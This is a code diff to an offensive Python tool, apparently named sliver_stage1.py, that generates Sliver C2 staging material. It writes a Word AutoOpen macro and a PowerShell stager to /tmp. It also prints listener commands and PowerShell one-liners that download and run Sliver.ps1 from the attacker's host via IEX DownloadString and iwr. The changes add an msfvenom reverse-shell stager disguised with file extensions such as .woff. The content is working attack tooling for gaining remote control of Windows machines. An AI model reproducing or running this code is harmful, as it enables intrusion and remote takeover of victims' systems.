@@ -2,7 +2,7 @@
 import sys, base64, argparse, os
 from argparse import RawTextHelpFormatter
 
-def main(lhost, lport, webport):
+def main(lhost, lport, webport, protocol, extension):
    with open(output, "w") as f:
        f.write("""Sub AutoOpen()
 \tMyMacro
@@ -31,24 +31,30 @@ End Sub
    # Start Printing Output :)
    print (CRED + '==== Sliver Stager Setup ====\n' + CEND)
    print (f'profiles new --mtls {lhost}:$mlts_port --format shellcode win64\n')
-   print (f'stage-listener --url http://{lhost}:{lport} --profile win64\n')
-
+   print ('')
+   print ('HTTP Stage Listener')
+   print ('')
+   print (f'stage-listener --url {stageprotocol}://{lhost}:{lport} --profile win64\n')
+   print ('')
+   print ('MSF Stage Listener')
+   print (f'stage-listener --url {stageprotocol}://{lhost}:{lport} --profile win64 --prepend-size')
+   print ('')
 
    print (CRED + '==== Sliver Macro Payload ====\n' + CEND)
    print(file_contents)
    print (CGREEN + '#> Sliver_Macro.txt was written to CWD\n' + CEND)
-   if 'Sliver_Macro.txt' in itemlist:
-      print (cwd + '/Sliver_Macro.txt\n')
+   if '/tmp/Sliver_Macro.txt' in itemlist:
+      print ('/tmp/Sliver_Macro.txt\n')
 
    #write to file Sliver.ps1
-   file = open ("Sliver.ps1","w")
+   file = open ("/tmp/Sliver.ps1","w")
    file.write (payload)
    file.close
 
    print (CRED + '==== Sliver.ps1 Script Staging ====\n' + CEND)
    print (CGREEN + '#> Sliver.ps1 was written to CWD\n' + CEND)
    if 'Sliver.ps1' in itemlist:
-      print (cwd + '/Sliver.ps1\n')
+      print ('/tmp/Sliver.ps1\n')
    print (CGREEN + '#> Host a webserver\n' + CEND)
    print (f' python3 -m http.server {webport} ')
    print ('')
@@ -65,6 +71,9 @@ End Sub
    print ('')
    print (iwr2)
    print ('')
+   print (CRED + f'==== MSF Stager Command ====\n' + CEND)
+   print (msfstager)
+   print ('')
    print (CPURPLE + 'Bred as living shields, these slivers have proven unruly—they know they cannot be caught.' + CEND)
 
 def menu():
@@ -79,15 +88,19 @@ def menu():
 
 # argument parser
 
-parser = argparse.ArgumentParser(description=menu(),formatter_class=RawTextHelpFormatter, usage="python evil_macro.py -l --lhost sliver stage-listener ip -p --port sliver stage-listener port --wp --webport Python HTTP.SERVER port")
+parser = argparse.ArgumentParser(description=menu(),formatter_class=RawTextHelpFormatter, usage="python sliver_stage1.py -l --lhost <sliver stage-listener ip> -p --port <sliver stage-listener port> --wp --webport <Python HTTP.SERVER port> -P --protocol <stager protocol (http, https, tcp)> -e --extension <Sliver Stager extension (eG woff, jpg, md, html)>")
 parser.add_argument('-l','--lhost', dest='lhost', action='store', type=str, help='Insert an lhost for Sliver stage-listener', required=True)
 parser.add_argument('-p','--lport', dest='lport', action='store', type=int, help='Insert an lport for Sliver stage-listener', required=True)
 parser.add_argument('-wp','--webport', dest='webport', action='store', type=int, help='Insert an lport for Python HTTP.Server for .ps1 staging', required=True)
+parser.add_argument('-P','--protocol', dest='stageprotocol', action='store', type=str, help='Insert a protocol for Sliver Stager MSF variant', required=True)
+parser.add_argument('-e','--extension', dest='extension', action='store', type=str, help='Insert an extension to use for Sliver Stager (.woff is default)', required=True)
 
 args=parser.parse_args()
 lhost = args.lhost
 lport = args.lport
 webport = args.webport
+stageprotocol = args.stageprotocol
+extension = args.extension
 
 # Sliver PS Stage1 Script
 
@@ -131,7 +144,7 @@ payload = buf
 
 itemlist = os.listdir()
 cwd = os.getcwd()
-output = "Sliver_Macro.txt"
+output = "/tmp/Sliver_Macro.txt"
 
 # payload variables
 
@@ -140,6 +153,7 @@ echocmd = f'echo IEX(New-Object Net.WebClient).DownloadString("http://{lhost}:{w
 echocmd2 = f'C:\Windows\System32\cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString("http://{lhost}:{webport}/Sliver.ps1") | powershell -noprofile -'
 iwr = f'powershell.exe iwr -UseBasicParsing http://{lhost}:{webport}/Sliver.ps1 -Outfile %TMP%\Sliver.ps1; %TMP%\Sliver.ps1'
 iwr2 = f'C:\Windows\System32\cmd.exe /c powershell.exe iwr -UseBasicParsing http://{lhost}:{webport}/Sliver.ps1 -Outfile %TMP%\Sliver.ps1; %TMP%\Sliver.ps1'
+msfstager = f'msfvenom -p windows/x64/custom/reverse_win{stageprotocol} LHOST={lhost} LPORT={lport} LURI=/statistics.{extension} -f raw -o /tmp/sliver_stager.bin'
 
 # Color Coding
 
@@ -148,4 +162,4 @@ CGREEN = '\033[92m'
 CPURPLE = '\033[95m'
 CEND = '\033[0m'
 
-main(lhost, lport, webport)
+main(lhost, lport, webport, stageprotocol, extension)
